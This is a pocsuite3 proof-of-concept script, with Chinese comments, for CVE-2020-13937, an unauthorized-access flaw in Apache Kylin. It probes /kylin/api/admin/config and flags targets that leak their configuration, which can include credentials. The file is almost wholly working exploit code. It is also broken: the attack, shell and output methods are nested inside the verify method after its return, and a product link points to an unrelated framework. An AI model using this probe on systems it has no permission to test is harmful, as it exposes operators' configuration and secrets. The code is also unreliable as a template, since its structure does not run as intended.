"""
作者 charis
时间 2023-1-6
"""
import time
import re
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list
from pocsuite3.modules.dnslog import Dnslog
from pocsuite3.modules.encryption import Encryption
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString


class DemoPOC(POCBase):
    vulID = '3'  # ssvid
    version = '1.0'
    author = ['charis']
    vulDate = '未知'
    createDate = '2023-01-06'
    updateDate = '2023-01-06'
    references = ['https://help.aliyun.com/noticelist/articleid/1060733129.html']
    name = 'Apache Kylin API未授权访问漏洞'
    appPowerLink = 'http://www.thinkphp.cn/'
    appName = 'Apache Kylin'
    appVersion = 'Kylin 2.x.x Kylin <= 3.1.0 Kylin 4.0.0-alpha'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    desc = '''Apache Kylin™是一个开源的、分布式的分析型数据仓库。近日Apache Kylin官方修复 CVE-2020-13937 API未授权访问漏洞。攻击者可构造恶意请求，访问API地址，可以获取Apache Kylin的相关配置信息，从而导致身份凭证等信息泄漏。阿里云应急响应中心提醒 Apache Kylin 用户尽快采取安全措施阻止漏洞攻击'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    # 定义检查方法
    def _check(self, url):

        payloads = [
            r"/kylin/api/admin/config",
        ]

        for payload in payloads:
            vul_url = url + payload

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1"
            }
            try:
                r = requests.get(vul_url, headers=headers)
                if r.status_code == 200:
                    flag = re.findall(r'\{.?config.?:.*\}', r.text, re.DOTALL)
                    if flag:
                        return url, payload
            except requests.exceptions.RequestException as e:
                pass
        return False

    def _verify(self):

        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['payload'] = p[1]
        return self.parse_output(result)

        def _attack(self):
            exit("无需获取shell")

        def _shell(self):
            exit("无需获取shell")

        def parse_output(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail('target is not vulnerable')
            return output

register_poc(DemoPOC)


